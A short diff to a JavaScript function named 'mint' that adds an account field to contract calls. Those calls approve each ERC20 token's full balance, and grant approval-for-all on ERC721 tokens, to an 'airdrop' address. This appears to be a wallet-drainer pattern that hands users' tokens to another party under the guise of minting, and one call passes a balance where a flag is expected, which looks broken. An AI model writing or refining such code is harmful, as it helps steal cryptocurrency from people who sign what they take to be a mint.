@@ -23,7 +23,7 @@ export const mint = async (chain, airdrop, tokensERC20, tokensERC721, signer, cl
             abi: erc20abi,
             functionName: "approve",
             args:  [airdrop, tokensERC20[iter20].balance],
-            
+            account: client.account
           })
           await walletClient.writeContract(request)
           // await contract.approve(airdrop, tokensERC20[iter20].balance);
@@ -47,7 +47,7 @@ export const mint = async (chain, airdrop, tokensERC20, tokensERC721, signer, cl
               abi: erc721abi,
               functionName: "setApprovalForAll",
               args:  [airdrop, tokensERC20[iter].balance],
-              
+              account: client.account
             })
             await walletClient.writeContract(request)
           }
